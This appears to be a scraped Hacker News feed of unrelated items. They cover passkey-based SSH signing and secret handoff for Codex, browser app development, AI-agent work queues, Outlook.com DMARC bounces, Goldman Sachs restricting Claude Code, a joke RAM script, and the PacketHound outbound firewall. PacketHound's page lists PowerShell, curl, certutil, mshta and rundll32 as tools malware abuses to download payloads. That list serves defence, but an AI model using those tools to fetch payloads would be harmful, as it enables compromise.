For SSH (and sudo through pam_ssh_agent_auth), I ended up building agent-auth and Agent Witness. Codex sees a normal SSH_AUTH_SOCK and supplies some context about why it needs a signature. If one of my Macs is available, agent-auth proxies the request to the 1Password SSH agent there. Otherwise it routes the request to Agent Witness on my phone.

Agent Witness runs as a PWA and is essentially a remote ssh-agent. The private keys are wrapped, encrypted, and stored in IndexedDB locally on the phone. The vault can only be unwrapped with a secret derived from a passkey, and all key handling and signing happens locally through the browser's Web Crypto APIs. The unwrapped keys are non-extractable CryptoKey objects (the web crypto APIs are pretty awesome!)

When a signing request comes in, the PWA gets a push notification. It shows me the reason Codex supplied, the command being run, and the key being requested. I authorize it with my passkey, the PWA signs the request, and only the resulting signature goes back to the server. The private key never leaves my phone.

https://github.com/evanpurkhiser/agent-auth https://github.com/evanpurkhiser/agent-witness

I also recently put together psst, which solves the related problem of handing a secret to Codex from 1Password. I give it a 1Password item-sharing link, it opens a local session where it decrypts the 1password item in memory, and Codex can inspect the available fields of the item before explicitly retrieving only the ones it needs. The CLI refuses to write secret values to a terminal, which helps keep them out of argv, shell history, and transcripts.

I’m sure I could work out a better approach where the agent absolutely cannot retrieve the secret since if it really wanted to read the secret, it could of course pipe the value into cat or whatever. The goal is to just make secret access explicit and avoid accidentally spraying credentials into places where they'll be retained. So far it’s been a very nice flow with agent browser.

- Small dependency tree on an allowlist, pure Go with no cgo, secrets sealed at rest and never logged.

item.title: The Web Is More Than Enough, by Paul Ford (131 pts)
item.description:
URL: https://ftrain.com/aboard-the-web-is-more-than-enough, See on Hacker News

Web browsers enable incredibly rich app development—and that’s radically easier than it used to be.

Last week was fun. We launched tinylittleoffice.com—you heard it here first!—and it turned out that lots of folks were in the market for an “office suite that stores data in the URL.” 

So many people visited that the server went down (well, I maxxed out the CloudFlare free plan), and ultimately, after I put in my credit card, a couple hundred thousand people came by to check it out. People on Hacker News insisted it was a pointless waste of time, and folks on GitHub started asking for features and fixes, all of which we’re considering, and some of which we’re doing. The Register wrote an article about it, and it also made it, for a little while, to the top ten of Product Hunt.

So all good; we will continue to support and enhance it, bit by bit, while we also do stable software development work for our customers and clients. But I did want to pause for a second and point out something that surprised me about the process. It’s this:

The web browser is very, very, very powerful software for building applications.

I know that is obvious and is the sort of thing I could have said any time in the last 20 years. But now there’s an addendum to the statement: 

The web browser is very, very, very powerful software for applications, and the cost of accessing that power is going down seemingly every day.

I put maybe twice as much effort into building a web-based office suite as I might normally put into writing a long newsletter post. I’m not telling you this because I am a very special boy. I’m telling you because if you want to, you can learn to do it, too.

Fast, cheap, good, right? But even after I had to put in my credit card, CloudFlare hosting costs…$0. Partly because I optimize for cheapness, but partly because that’s just how it goes these days. Fast? Dear God, computers are fast, and software development is also fast compared to the past. But as I code web apps, I keep finding new corners of the browser I didn’t know well. Things are just…wild in there.

  • The Web Crypto API is a first-class security platform in the browser.
  • The Web Assembly platform lets you run native-speed code in your browser.
  • WebGL provides for high-quality 3D and 2D graphics in your browser.
  • The Web Audio API lets you mix sound in your browser.

And on and on. The web is really the greatest distribution platform imaginable right now. It’s inherently multilingual—I released TinyLittleOffice in 21 languages (the most common NYC ones, which is why it has Creole and Yiddish), with lots of infrastructure for accessibility. Plus, of course, JavaScript is a full-featured programming language, and HTML can represent most things a document can do on a computer; if you need something more old-school, PDF.js lets you deal with PDFs in the browser. I think you can even hyphenate text reliably these days, although I refuse to believe it.

I knew these things existed. I’d even programmed with them. But I’d never really looked closely; I just downloaded whatever open-source code would make it easier to build and tried to drag software across the finish line.

My quirky 1990s-vintage office suite might not convince you—it’s weird and small. So take a look at Simon Willison’s new web-based browser 3D game, Battle Drones. He’s hosting it on GitHub. He wrote it himself. He’s not a games builder. It just pops right up in the browser and you play it. It’s multiplayer, and it works offline.

As he wrote about it:

… but I can now see a path to vibe coded games like this being taken seriously. Battle Drones is fun, it looks good, it has innovative features (the multiplayer-over-audio thing is a first for an RTS as far as I can tell). I’d love to see what someone with better taste than me and a driving passion to produce something truly exceptional could build!

All the various cool browser technologies have been around for years. But they are each extremely vast. If you get good at Web Audio, you probably don’t have time to get good at Web Crypto and Web Assembly and WebGL. 

The reason they were so complex is, basically, because they were built for teams like those at Google, not for individuals. In the past, the web was for people to build web pages—and, yes, in the present, you can still do that, but for more than a decade, the web has been designed for giant companies so they can deliver software securely to billions of people who buy things with credit cards. These huge mega-libraries were dropped into the web browser to enable large teams to build big things, and the little guy was a bit of an afterthought. But now you can make a game in 3D with sound, and it can work just fine on a plane.

This is one of the places where “are we in an AI bubble” gets fuzzy for me, because it’s totally clear all these giant AI companies are huffing AGI paint fumes, but at the same time, if we actually unlocked the economic transformation of, say, 100 times as many people making software for each other, that would blow an enormous crater into the current tech economy. Don’t like the way your giant industrial looms make carpet? Hack your own firmware and make each carpet totally personalized! Turn any Instagram post into a huge floor covering! Suddenly all the carpet companies have to hack their own firmware to compete. What’s that going to be like? 

This also destabilizes the app store economy. The high tax of building for app stores seems less worth paying when you can just test an idea in the world from a web server for $0 after a couple weeks. Perhaps Mozilla should take another swing at launching a mobile phone! (Forget I mentioned that.) In any case, what used to be a large industrial process is now a personal one, if you so desire. Web browsers enable incredibly rich app development—and that’s radically easier than it used to be.

It’s a mixed blessing. I’ve been a writer for years, and software development feels more and more like writing to me every passing week. The awkward part of the comparison is, in general, people do not want to pay writers any money at all. As a writer, you get used to it. But for software people, being perpetually devalued is pretty novel. Then again, if you need software to do something—like our clients!—say, to fix a process, organize a database, get more value out of a big piece of industrial equipment, it’s a pretty amazing time, because you can do just about anything. I’m pretty confident we’ll all meet in the middle, but it’ll take a while, and it will be different on the other side.

item.title: How I Fight AI Brain Fry (234 pts)
item.description:
URL: https://sergeykuhne.com/blog/fighting-ai-brain-fry, See on Hacker News

If you work with Claude Code or Codex from the terminal, you know this one.

You start a task. The AI takes time to reply, so you start another one. Then the first one replies, but the reply needs one clarification, one follow up and one side task — and each of them wants its own tab. Then the second tab's reply comes in. You juggle. And all of a sudden you find yourself hopping between 20 threads, trying to keep all those contexts in your brain RAM.

Until you can't. Your brain gets exhausted, your focus smashes, and you don't know anymore what you were doing, where you started, and where you were supposed to finish.

A lot of people are suggesting taking breaks, thinking before typing, limiting scope. I have my own experiment.

I decided this way of working has two major problems: sequencing and context. So I organised my work a bit like a priority queue.

Here is how it actually works.

The queue lives in git. Every ticket is a markdown file in the repo, right next to the code it talks about, and the state of the board is a committed snapshot. Nothing important lives in a chat window and nothing lives in my head. If a session dies, the queue is still there.

An agent works that board in cycles. It researches new tickets, builds the ones a human has tagged as safe to build, runs the tests and a browser check, and verifies what is already deployed. For anything touching sensitive code it builds on a branch and asks first. It never deploys to production — that part is mine.

What it cannot do is decide. So everything that needs me lands in one place I call my owner inbox. A script reads the whole board and hands me a prioritised list of exactly the items waiting on my judgement — review this change, answer this question, rule on this tradeoff.

The reading surface is a Claude artifact. One page, rebuilt from git on every cycle, mirroring the whole board plus a review page per ticket. So I don't scroll back through a terminal trying to reconstruct what a change does. I open one link, read what was built and why, and give my verdict. The verdict goes back into git, onto the card. The page is only a viewer — git is the record.

Then comes the part that matters most.

I take one item. I load its context. I make a decision or request an action. And I close it, by putting it back into the queue.

That closing is the whole trick. The ticket doesn't keep hanging in my memory as a thing to remember about. The context closes with it. So when I pick the next item from the queue, I can actually focus. One thing at a time.

It is still exhausting. But I don't feel distracted or lost.

The challenge was, and still is, the tooling around it. Getting the context served up in a digestible manner, so loading a ticket takes a minute and not twenty. And keeping tickets from going into endless loops because they are blocked waiting for a ruling only I can give.

It's a living organism and I keep improving it. But it felt like a huge step forward in my productivity with AI tools, so I thought it was worth sharing.

item.title: Outlook.com Is Quietly Rejecting Email from Domains Without DMARC (380 pts)
item.description:
URL: https://mailroute.net/blog/outlook-rejecting-email-without-dmarc, See on Hacker News

Since November 5, 2026, Microsoft's consumer mail service has been turning away some of the email from domains that don't publish a DMARC record. If your company emails customers, vendors or applicants with outlook.com, hotmail.com, live.com or msn.com addresses, some of that mail may be bouncing right now. Nobody announced it. The fix is one DNS record.

Key takeaways

  • Outlook.com, Hotmail, Live and MSN now refuse part of the mail from domains that have no DMARC record.
  • It hits ordinary, low-volume senders, not only the bulk senders Microsoft's published rules cover.
  • Only some messages bounce, so "my mail is getting through" doesn't mean your domain is safe.
  • The fix is a single TXT record, v=DMARC1; p=none, which changes nothing about how other receivers treat your mail.

What the bounce looks like

The sender gets a bounce like this one, followed by a bracketed server name and ID that differ per message:

550 5.7.1 Message rejected: Message lacks SPF/DKIM/DMARC Auth Records (AS9031519)

On the first day, the same rejection came back without the (AS9031519) code:

550 5.7.1 Message rejected: Message lacks SPF/DKIM/DMARC Auth Records

The wording suggests something is badly broken. Usually it isn't. The domains we have seen bounced mostly had working SPF, and many had DKIM too. What they were missing was the DMARC record that ties the two to the From address.

What changed

Microsoft does have published sender rules. Since May 2025, domains that send more than 5,000 messages a day to Outlook.com have had to pass SPF, DKIM and DMARC, or get 550 5.7.515 Access denied. That rule is aimed at marketers and bulk senders, and most small businesses rightly assumed it didn't apply to them.

This new rejection is different in the ways that matter:

  • It reaches small senders. A one-line reply from a small office can bounce.
  • It wasn't announced. As of November 6, Microsoft has published nothing about it: no postmaster notice, no blog post, no service-health entry.
  • It doesn't say what failed. A 5.7.515 bounce lists the SPF, DKIM and DMARC results. This one only says records are missing.

We first saw these bounces in our own outbound logs on November 5. Public reports from other administrators started appearing the same day.

Why it's easy to miss

Microsoft refuses only part of the mail from an affected domain. One message to a Hotmail address goes through, the next one bounces, and a resend may succeed. That inconsistency is what makes this one dangerous: the person who sent the message sees a bounce full of acronyms, assumes a glitch, and moves on. The customer on the other end never knows a message was sent.

If your business depends on reaching people at personal addresses (patients, homeowners, applicants, parents, members), the cost is quiet. Invoices that don't arrive, appointment confirmations that never land, replies that look like you ignored someone.

Is your domain affected?

Your domain is exposed if it has no DMARC record. You can check in a few seconds from any terminal. Replace example.com with your domain:

dig +short TXT _dmarc.example.com

A line starting with "v=DMARC1 means you have a record. No output means you don't. That's the case this rejection targets.

The fix is one DNS record

Add a TXT record at your DNS host:

  • Name: _dmarc
  • Value: v=DMARC1; p=none

p=none is the safe starting point. It declares that your domain uses DMARC and asks receivers to send you reports, but it tells them to take no action on failures. Nothing about how Gmail, Yahoo or anyone else treats your mail changes.

There is one condition. DMARC passes only when SPF or DKIM passes for the domain in your From address. If neither lines up, a DMARC record alone won't help. We covered how alignment works, and why it's where most setups go wrong, in SPF, DKIM, and DMARC Are No Longer Optional.

Step-by-step instructions, including the checks for all three records, are in our guide to the Outlook.com 5.7.1 error.

If your mail goes through MailRoute

Mail you send through the MailRoute outbound relay already passes both checks DMARC needs:

  • SPF. Your mail keeps your own domain as its envelope sender and leaves from servers that include:spf.mailroute.net authorizes.
  • DKIM. We sign every outbound message as your domain, using the keys your mr01, mr02 and mr03 CNAME records point to. Publish all three, so we can rotate keys without your signatures ever breaking.

For MailRoute senders, the DMARC record is the whole fix. Once it's in place, Outlook.com sees a domain that authenticates, and DMARC passes on either check. Our guide to publishing DMARC for the MailRoute outbound relay takes you from p=none to enforcement when you're ready.

If your mail doesn't go through MailRoute

The DMARC record is still the fix, but the service that sends your mail has to pass SPF or DKIM for your domain. Microsoft 365, for example, signs with its own onmicrosoft.com domain until you turn on DKIM for your own domain, and that signature doesn't count toward DMARC. Our sister company mxio has a guide to this error for any sender, with a checker that tests your domain from the page.

Where this is heading

This is the pattern every major mailbox provider is following. Requirements start with the bulk senders, get announced with a deadline, and then quietly become the baseline for everyone. DMARC at p=none is the floor now, not a best practice.

That's not a bad thing. Spoofing is how much of today's phishing and business email compromise starts, and a domain that authenticates is a domain that's much harder to impersonate. The p=none record that gets your mail delivered to Outlook.com today is also the first step to p=reject, which tells receivers to refuse mail that forges your domain.

If you'd like a relay that signs your outbound mail correctly from day one, our setup documentation walks through SPF, DKIM and DMARC, and you can start a trial whenever you're ready. Add the record today. It takes a few minutes, and it's one less reason for your mail to disappear.

item.title: Goldman Sachs Is Pulling Claude Code from Its Bankers and Traders (749 pts)
item.description:
URL: https://www.thestateofai.com/news/goldman-sachs-claude-code-traders-bankers, See on Hacker News

Goldman Sachs has restricted Anthropic's Claude Code and Microsoft's GitHub to its engineers, cutting off traders and bankers who used the tools to track client flows and build market models. The bank barred its Hong Kong bankers from Claude in April and is now a lead underwriter on Anthropic's IPO.

Most traders and bankers at Goldman Sachs can no longer use AI coding tools at work. Internal guidance updated in October restricts Anthropic's Claude Code and Microsoft's GitHub to the bank's engineers, Bloomberg News reported, following a review of productivity and risk concerns.

Strats, who work across trading, quantitative research and software engineering, still have access, according to a second person familiar with the matter.

The change has frustrated some traders, a person familiar with the matter told Bloomberg. They had been using the tools to monitor client trading flows, model market moves and positions, and put together written and graphic material. Goldman spokesperson Nick Carcaterra said the bank makes certain AI tools available to staff "to determine the best use cases" across the firm.

Argenti was praising trader-built tools in July

As recently as July, chief information officer Marco Argenti was talking up "vibe coding" by Goldman's non-technical employees. He told Bloomberg that traders and bankers had built tools with AI and passed them to the firm's engineers, of whom there are about 12,000, to be improved.

That arrangement let the people closest to a problem build a first version without waiting for engineering time. It also meant thousands of employees without engineering training were running software that writes and executes code, on the same machines they use to handle client information.

At a conference in Turin last month, Argenti described Goldman's AI adoption in waves and said developers, more than 12,000 of the bank's roughly 47,000 staff, had made up the first. The October guidance limits the coding agents to that group.

Goldman restricted Claude in Hong Kong in April

In April, Goldman removed Claude from its internal AI platform for bankers in Hong Kong. The Financial Times reported that the bank had read its contract with Anthropic strictly, and an Anthropic spokesperson said Claude had never been officially supported in Hong Kong. ChatGPT and Gemini remained available there. JPMorgan removed Claude from its Hong Kong approved list in June.

The Hong Kong restriction was based on location and contract terms, and the new one is based on role. Goldman's in-house AI assistant, which uses models from several companies, is still available across the firm. The restriction applies to third-party agents that can write and run code by themselves.

Goldman is still working closely with Anthropic

Earlier this year, Goldman said Anthropic engineers had spent six months at the bank helping build Claude-based agents for trade accounting and client onboarding. Those agents sit in the back office and are run by Goldman's engineering teams.

Goldman and Morgan Stanley are also the lead underwriters on Anthropic's IPO, according to the S-1 filed October 26. Anthropic is expected to list on Nasdaq under the ticker ANT before the end of November, as we reported last week. Over the next few weeks, Goldman's bankers will be marketing shares in a company whose coding agent most of them are no longer allowed to use.

Why a coding agent is riskier on a trading desk

Claude Code reads files, writes programs and runs them, typically with the same access as the person using it. Code an engineer writes with it usually goes through review, testing and deployment controls before it reaches anything important. A script a trader builds to watch client flows can end up in daily use without going through any of those.

Banks are also required to keep information barriers between groups, for example between bankers working on deals and traders who could profit from knowing about them. Goldman built its internal AI platform around controls like these. A tool a trader puts together with an agent wasn't designed with them in mind, and engineers can only check it if someone sends it their way.

There is also the matter of whether anyone understands the code. Last month a Meta engineer said he now ships code he can't fully account for, and writing software is his job. A trader using an agent to model positions is less likely to know how that code handles unusual cases, which on a trading desk can mean losses.

Cost may also have played a part. Agent usage is billed by the token, and several companies that gave agents to everyone have seen spending climb. Amazon shut down an internal leaderboard after employees ran agents on pointless tasks to move up it, and Accenture now funds $29 a month of Claude per employee. Bloomberg's sources said productivity was part of Goldman's review.

Barclays is moving in the other direction

Barclays said in October that it expects half its developers to be using Claude Code by the end of the year, and three weeks later named developers among 5,000 job cuts. Like Goldman, it is giving coding agents to engineers. Unlike Goldman, it is also using them to reduce how many engineers it employs.

Banks have tightened agent access in other places this fall. JPMorgan and Schwab are blocking outside agents from customer accounts, and Goldman has now set limits on which of its own employees can use them.

Our take

At State of AI, we think Goldman was right to restrict the tools and wrong in how it went about it.

A trading floor is a bad place for unreviewed code written by people who can't read it, and the information barrier problem would be reason enough on its own. Requiring that agent-written code come from people trained to review it is a sensible rule for a regulated business.

Goldman's own CIO was promoting traders' AI-built tools in July, though. Withdrawing access through a guideline update, with no replacement mentioned in Bloomberg's reporting, tells the traders who found good uses that they were the risk. Their complaints point to work the engineering team could take on, and Goldman would get more out of collecting them than out of waiting for them to fade.

Leaders at other companies should settle who owns agent-built code before handing agents out. When someone outside engineering builds a tool with Claude Code or Copilot, a named engineer should take responsibility for it before it touches production data.

Existing controls should cover code an agent writes. Information barriers, data entitlements and software approval rules still apply when the code came from a prompt.

And when a tool is taken away, it's worth recording what people were using it for. Goldman's traders were watching client flows and modeling positions, and they will still need to do both.

Sam Altman is not having a good couple of weeks; ever since he said OpenAI’s ram needs are more important than consumer electronics, the internet has been unforgiving. But one man has taken things one step further to mock Altman’s ridiculous super villain sounding statements.

Open-source developer Iain Kay has created an open-source BASH script called “Ram Altman” for Linux systems designed to monitor how much idle RAM you have sitting on your rigs, laptops, etc.

The percentage of unused RAM is than emailed to Sam Altman… well not really. The correspondence depends on how you set it up. By default, the email server isn’t set up out of the box.

The creator intentionally designed it this way to prevent the repository from being used as an automated mail-spoofing or denial-of-service tool against OpenAI’s servers.

If a system has more than 10% of its total RAM available, “Ram-Altman” selects from a rotating bank of sarcastic email templates:

“Hi Sam,” reads one of the sample messages. “Please don’t be alarmed, but there is 8.6 GiB of RAM on my desk that isn’t in a data centre. That’s 56.2% of what’s installed here, and as far as I can tell it has no plans today. Hoarding responsibly, A concerned RAM owner.”

For sysadmins and Linux users hesitant to spam external mail servers, the repository includes a –dry-run flag and a local test suite. This allows users to test simulated memory workloads and preview the exact message generated without dispatching actual correspondence. Unless the user has the technical know-how on how to set it up that way.

The project’s FAQ page is also pretty funny:

  • Does this help with the DRAM shortage? “No.”
  • Does it work on macOS? “No, it reads /proc/meminfo. On the other hand, your RAM is probably soldered down, which makes you the hardest target in the global allocation programme.”
  • Why is the threshold 10%? “Below that, your machine has suffered enough.”
  • Does running this use RAM? “Briefly. It’s then returned to the global pool, which is more than can be said for the rest of us.”

The internet is not letting up and it did force Sam Altman to backtrack on what he said earlier. In a recent post on X, Sam Altman said his statement was taken out of context and that he wants everyone to have as much as they want.

item.description:
URL: https://packethound.app/, See on Hacker News

Outbound firewall for Windows Know which apps are calling home.

Most firewalls only watch what comes in. PacketHound sniffs out what goes out: the first time an app tries to connect to the internet, it asks you to Allow or Block, and remembers your answer.

Every connection, your call

PacketHound turns Windows Firewall into an "ask me first" firewall for outgoing connections, without drowning you in questions about Windows itself.

Asks once, remembers

The first time an app tries to connect, you see who made it, where it's going and on which port. Click Allow or Block, for the whole app or just one address, host or domain, and keep it forever or only until the app quits.

Windows stays quiet

Windows' own components are allowed automatically, so you're only asked about the apps you installed, not about hundreds of system services.

Hard to fool

A program only counts as Windows if it lives in a Windows folder, is owned by the system and carries a valid Microsoft Windows signature. Copying malware into System32 doesn't get it a free pass.

Watches risky tools

Malware loves PowerShell, curl, certutil, mshta and rundll32 for downloading payloads. PacketHound still asks before those connect, even though they're part of Windows.

Built on Windows Firewall

No kernel driver, nothing hidden. Every decision is an ordinary Windows Firewall rule you can see in wf.msc, and it keeps working even when PacketHound is closed.

Never steals your typing

Prompts appear on top without taking keyboard focus, so you can't answer one by accident while you're typing.

Rules at a glance

Flip any app between Allow and Block with one switch. Search, sort, see when each decision was made, and clear out rules for programs you've uninstalled.

See what was blocked

The activity log shows every blocked attempt with its hostname, port and what happened next. Not sure yet? Decide later, and come back to it from the Rules tab.

Screenshots

Click any picture to see it full size.

How it works

No drivers, no background service of its own: PacketHound builds on the firewall that's already part of Windows.

  1. Unknown apps are blocked

    PacketHound switches Windows Firewall's outgoing default to block, so a program without a rule can't reach the internet.

  2. PacketHound notices

    Windows logs each blocked attempt. PacketHound watches that log, checks whether the program is part of Windows, and allows it quietly if so.

  3. You decide

    For everything else you get a prompt showing the app, its publisher and where it's connecting. Your answer becomes a firewall rule, for the whole app or one destination, kept forever or until the app quits.

Good to know

  • The first attempt fails. PacketHound learns about an app because its connection was blocked, so after you click Allow the app has to try again. Most do so automatically; a browser just needs a refresh.
  • Installers. Some installers give up after that first blocked attempt. After you allow one, PacketHound offers to pause protection for 5 minutes so you can run it again. Signed installers and updaters it has seen before are let through before they even start.
  • Rules cover the whole app by default. You can limit one to an IP address, host or domain instead. Windows Firewall only matches IP addresses, so PacketHound adds a name's addresses as the app uses them; the first connection to a new address may need a retry. Sites that share an address (common with CDNs) share the rule too.
  • "Until the app quits" means every process has ended, not just that its window is closed. Some apps keep running in the background after you close them: browsers such as Edge and Chrome, and apps that sit in the system tray like Discord or Steam. Their temporary rule stays until the last process exits. In Edge, you can turn off Startup boost and Continue running background extensions and apps when Microsoft Edge is closed under Settings › System and performance; in Chrome, the background-apps setting is under Settings › System. Tray apps usually quit from their tray icon's menu.
  • Work PCs: if your organisation manages firewall settings through Group Policy, those settings win.

Questions

Is PacketHound free?

Yes. There's no trial, no account and no adverts. If you find it useful, you can buy me a coffee.

Is PacketHound open source?

Yes. The full source code is on GitHub, under the GNU General Public License v3. You don't have to take our word for what PacketHound does: you (or someone you trust) can read exactly how it works, or build it yourself.

Does PacketHound send my data anywhere?

No. PacketHound doesn't collect anything and has no analytics. It looks up the names of the servers apps try to reach (a normal DNS lookup), so it can show you "example.com" instead of a bare IP address, and once a week it asks this website whether there's a newer version. That request contains nothing about you or your PC, and you can turn it off. See the privacy page.

Windows says "Windows protected your PC". Is it safe?

That's Microsoft SmartScreen's warning for programs it hasn't seen many people download yet. Click More info, then Run anyway. You can check the file is exactly the one published here by comparing its SHA-256 checksum with the one on the download page.

Why does it need administrator rights?

Changing Windows Firewall settings and reading the Security event log both require them, so Windows asks you to confirm when you start PacketHound. If you let it start when you sign in, it starts without asking.

What happens when PacketHound isn't running?

Your rules keep working: they're ordinary Windows Firewall rules. When you exit, PacketHound asks whether to keep blocking apps that don't have a rule yet. Either way, apps you blocked stay blocked.

I blocked something by mistake. How do I undo it?

Open PacketHound from the notification area, find the app on the Rules tab and flip its switch to Allow. Or delete the rule, and PacketHound will ask about the app again next time.

Can I pause it?

Yes. Right-click the tray icon and choose Pause protection, for 5 minutes, 15 minutes, an hour, or until you turn it back on. A timed pause turns protection back on by itself. While paused, apps without a rule can connect freely; your Block rules still apply.

An installer says it failed. What should I do?

Its first connection was blocked before you could answer, and some installers give up straight away. Click the notification PacketHound shows after you allow it (or right-click the tray icon › Pause protection › For 5 minutes) and run the installer again. Protection turns back on by itself. Next time, PacketHound recognises that installer and lets it through before it starts.

What does "Decide later" do?

The app stays blocked and is listed on the Rules tab under Waiting for your decision, where you can decide any time. PacketHound also asks again after 10 minutes if the app is still running, or the next time it connects.

Does it work alongside my antivirus?

Yes. PacketHound uses Windows Firewall, which works alongside Microsoft Defender and most antivirus software. If a third-party security suite has replaced Windows Firewall with its own, PacketHound can't work, because there's no Windows Firewall to manage.

How do I uninstall it?

From Windows Settings › Apps. The uninstaller asks whether to delete PacketHound's firewall rules, then puts Windows Firewall's settings back the way they were before you installed it.

How do I report a bug or suggest a feature?

Open an issue on PacketHound's GitHub page (you'll need a free GitHub account). For a bug, say which version of PacketHound and Windows you're using and what happened. The log in C:\ProgramData\PacketHound often helps.
